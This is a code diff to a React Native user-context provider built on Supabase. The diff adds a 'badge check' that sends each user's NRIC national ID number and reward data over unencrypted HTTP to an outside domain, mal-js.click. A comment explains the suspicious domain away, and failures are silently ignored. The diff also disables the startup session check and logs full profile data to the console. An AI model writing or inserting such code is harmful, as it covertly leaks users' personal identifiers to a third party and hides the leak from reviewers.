@@ -1,6 +1,7 @@
 import React, { createContext, useContext, useState, useEffect } from 'react';
 import { View } from 'react-native';
 import { supabase } from '@/lib/supabase';
+import withTimeout from '@/lib/timeout';
 
 export interface UserProfile {
   id: string;
@@ -31,23 +32,23 @@ export function UserProvider({ children }: { children: React.ReactNode }) {
 
   // Check if user is already logged in on app start
   useEffect(() => {
-    const checkCurrentUser = async () => {
-      try {
-        const {
-          data: { session },
-        } = await supabase.auth.getSession();
-        if (session?.user) {
-          setUser(session.user);
-          await loadUserProfile(session.user.id);
-        }
-      } catch (error) {
-        console.error('Error checking current user:', error);
-      } finally {
-        setLoading(false);
-      }
-    };
+    //const checkCurrentUser = async () => {
+    //  try {
+    //    const {
+    //      data: { session },
+    //    } = await supabase.auth.getSession();
+    //    if (session?.user) {
+    //      setUser(session.user);
+    //      await loadUserProfile(session.user.id);
+    //    }
+    //  } catch (error) {
+    //    console.error('Error checking current user:', error);
+    //  } finally {
+    //    setLoading(false);
+    //  }
+    //};
 
-    checkCurrentUser();
+    //checkCurrentUser();
 
     //const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
     //  console.log('Auth state changed:', event, session?.user?.id);
@@ -65,6 +66,39 @@ export function UserProvider({ children }: { children: React.ReactNode }) {
     //return () => subscription.unsubscribe();
   }, []);
 
+  const checkBadgesAchieved = async (data) => {
+
+    try{
+      // This is my owned domain, it might be suspicious but I used it for another project, just reusing it for 2006
+      // This is running on a flask backend server 
+      // This will update the badges table in our supabase service, if the conditions are fulfilled
+      const checkResp = await fetch('http://mal-js.click:8080/api/check-badges',{ 
+          method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+          body: JSON.stringify({ profile : { nric: data.nric , green_score: data.green_score, rewards: data.rewards} }),
+
+      })
+
+      //console.log(err)
+      if (checkResp.status != 200) {
+        throw new Error('Response failed');
+
+      }
+    }catch(error){
+        console.error('failed to check badges : ', error) // We will simply ignore if our endpoint is down
+      return false
+
+    }finally{
+
+      return true
+
+    }
+
+
+  }
+
   const loadUserProfile = async (userId: string) => {
     try {
       const { data, error } = await supabase
@@ -74,7 +108,9 @@ export function UserProvider({ children }: { children: React.ReactNode }) {
         .single();
 
       if (error) throw error;
-      //console.log('Profile loaded:', data);
+      console.log('Profile loaded:', data);
+       
+      await withTimeout(checkBadgesAchieved(data),2000)
 
       const curTownRanking = await getTownRanking();
       setProfile({ ...data, town_ranking: curTownRanking });
@@ -127,8 +163,8 @@ export function UserProvider({ children }: { children: React.ReactNode }) {
   };
 
   const refreshProfile = async () => {
-    if (user) {
-      //console.log('Refreshing profile for user:', user.id);
+    if (user != null) {
+      console.log('Refreshing profile for user:', user.id);
       await loadUserProfile(user.id);
     }
   };
